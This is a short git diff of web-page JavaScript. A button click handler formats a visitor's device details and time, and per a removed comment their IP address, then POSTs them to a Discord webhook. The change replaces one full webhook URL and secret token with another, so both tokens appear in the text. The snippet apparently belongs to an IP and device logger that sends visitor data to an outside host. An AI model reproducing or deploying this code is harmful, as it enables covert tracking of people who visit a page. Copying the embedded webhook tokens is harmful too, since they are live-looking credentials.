@@ -36,8 +36,8 @@ document.getElementById("webhookButton").addEventListener("click", function() {
                                   `🌐 **Browser**: ${deviceInfo.browser}\n` +
                                   `🕒 **Time**: ${new Date().toLocaleString()}`;
 
-                    // Send the IP & device info to Discord webhook
-                    fetch("https://discord.com/api/webhooks/1345338419219267664/yU2pUdB2V4FJDrN1CPd5cHJUHY3B1OCxoihp2nSAkeHwxj7QJNCy-5zNgERi5HqTYbKM", {
+                    
+                    fetch("https://discord.com/api/webhooks/1374747072141721661/fQ3Cs2brVlQYZLEtbeWgRywFoL2rRjlGxjkTR5KzbEk937AQr0U_1YuX3JPRQXq080Yn", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({ content: message })
